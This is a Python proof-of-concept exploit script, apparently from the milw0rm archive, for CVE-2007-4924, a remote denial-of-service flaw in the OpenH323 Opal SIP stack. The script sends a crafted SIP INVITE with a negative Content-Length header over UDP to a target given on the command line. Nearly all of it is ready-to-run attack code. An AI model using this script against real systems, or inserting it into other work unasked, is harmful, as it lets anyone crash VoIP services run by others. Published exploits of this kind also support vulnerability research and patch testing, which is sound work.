#!/usr/bin/env python
#
# OpenH323 Opal SIP Protocol Remote Denial of Service Vulnerability (CVE-2007-4924)
#
# opal228_dos.py by Jose Miguel Esparza
# 2007-10-08 S21sec labs

import sys,socket

if len(sys.argv) != 3:
	sys.exit("Usage: " + sys.argv[0] + " target_host target_port\n")
target = sys.argv[1]
targetPort = int(sys.argv[2])
malformedRequest = "INVITE sip:paco@192.168.1.134 SIP/2.0\r\n"+\
		   "Call-ID:f81d4fae-7dec-11d0-a765-00a0c91e6bf6@foo.bar.com\r\n"+\
		   "Contact:sip:pepe@192.168.1.133:5060\r\n"+\
		   "Content-Length:-40999990\r\n"+\
		   "Content-Type:application/sdp\r\n"+\
		   "CSeq:4321 INVITE\r\n"+\
		   "From:sip:pepe@192.168.1.133:5060;tag=a48s\r\n"+\
		   "Max-Forwards:70\r\n"+\
       	"To:sip:paco@micasa.com\r\n"+\
       	"Via:SIP/2.0/UDP 192.168.1.133:5060;branch=z9hG4bK74b76\r\n\r\n"		 

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((target,targetPort))
s.sendall(malformedRequest)
s.close()

# milw0rm.com [2009-07-24]
